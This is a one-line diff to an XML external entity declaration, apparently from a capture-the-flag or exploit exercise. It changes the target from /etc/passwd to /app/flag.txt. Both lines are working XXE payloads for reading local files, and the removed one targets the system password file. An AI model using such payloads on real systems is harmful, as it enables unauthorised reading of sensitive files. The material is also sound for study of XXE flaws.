@@ -1,1 +1,1 @@
-<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<!ENTITY xxe SYSTEM "file:///app/flag.txt">
